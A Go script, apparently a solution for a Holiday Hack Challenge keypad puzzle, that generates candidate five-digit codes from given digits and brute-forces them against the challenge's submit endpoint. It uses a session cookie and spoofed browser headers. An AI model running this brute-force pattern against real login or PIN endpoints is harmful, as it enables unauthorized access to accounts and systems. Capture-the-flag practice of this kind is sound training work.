package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"time"
)

func generateValidCodes() []string {
	baseNums := "7268"
	possibleDigits := []rune("72687268")
	validCodes := make(map[string]bool)

	var generatePermutations func(prefix []rune, remaining []rune)
	generatePermutations = func(prefix []rune, remaining []rune) {
		if len(prefix) == 5 {
			code := string(prefix)
			allPresent := true
			for _, d := range baseNums {
				if !bytes.ContainsRune([]byte(code), d) {
					allPresent = false
					break
				}
			}
			if allPresent {
				validCodes[code] = true
			}
			return
		}

		seen := make(map[rune]bool)
		for i, digit := range remaining {
			if seen[digit] {
				continue
			}
			seen[digit] = true

			newRemaining := make([]rune, len(remaining))
			copy(newRemaining, remaining)
			newRemaining[i] = newRemaining[len(newRemaining)-1]
			newRemaining = newRemaining[:len(newRemaining)-1]

			newPrefix := make([]rune, len(prefix), len(prefix)+1)
			copy(newPrefix, prefix)
			newPrefix = append(newPrefix, digit)

			generatePermutations(newPrefix, newRemaining)
		}
	}

	generatePermutations([]rune{}, possibleDigits)

	codes := make([]string, 0, len(validCodes))
	for code := range validCodes {
		codes = append(codes, code)
	}
	sort.Strings(codes)
	return codes
}

func makeCustomRequest() {
	id := "<insert-uuid>"
	cookie := "<insert-cookie>"
	url := fmt.Sprintf("https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=%s", id)

	headers := map[string]string{
		"Accept":             "*/*",
		"Accept-Encoding":    "gzip, deflate, br, zstd",
		"Accept-Language":    "en-US,en;q=0.9",
		"Cache-Control":      "no-cache",
		"Content-Type":       "application/json",
		"Origin":             "https://hhc24-frostykeypad.holidayhackchallenge.com",
		"Pragma":             "no-cache",
		"Priority":           "u=1, i",
		"Referer":            "https://hhc24-frostykeypad.holidayhackchallenge.com/",
		"Sec-Ch-Ua":          `"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		"Sec-Ch-Ua-Mobile":   "?0",
		"Sec-Ch-Ua-Platform": `"Windows"`,
		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	}

	client := &http.Client{}

	// Test request
	testPayload := map[string]string{"answer": "72682"}
	testBody, _ := json.Marshal(testPayload)
	testReq, _ := http.NewRequest("POST", url, bytes.NewBuffer(testBody))

	for k, v := range headers {
		testReq.Header.Set(k, v)
	}
	testReq.Header.Set("Cookie", fmt.Sprintf("CreativeCookieName=%s", cookie))

	testResp, err := client.Do(testReq)
	if err != nil || testResp.StatusCode != 200 {
		fmt.Println("Broken REQUEST CYCLE")
		return
	}
	testResp.Body.Close()

	validCodes := generateValidCodes()
	fmt.Printf("Total valid combinations to try: %d\n", len(validCodes))

	for _, code := range validCodes {
		payload := map[string]string{"answer": code}
		body, _ := json.Marshal(payload)
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))

		for k, v := range headers {
			req.Header.Set(k, v)
		}
		req.Header.Set("Cookie", fmt.Sprintf("CreativeCookieName=%s", cookie))

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("An error occurred: %v\n", err)
			continue
		}

		respBody := make([]byte, 1024)
		n, _ := resp.Body.Read(respBody)
		fmt.Printf("Status Code: %d -- ANSWER: %s\n", resp.StatusCode, code)
		fmt.Printf("Response Headers: %v\n", resp.Header)
		fmt.Printf("Response Content: %s\n", respBody[:n])
		resp.Body.Close()

		if resp.StatusCode == 200 && code != "72682" {
			fmt.Printf("Found valid code: %s\n", code)
			break
		}

		time.Sleep(time.Second)
	}
}

func main() {
	makeCustomRequest()
}
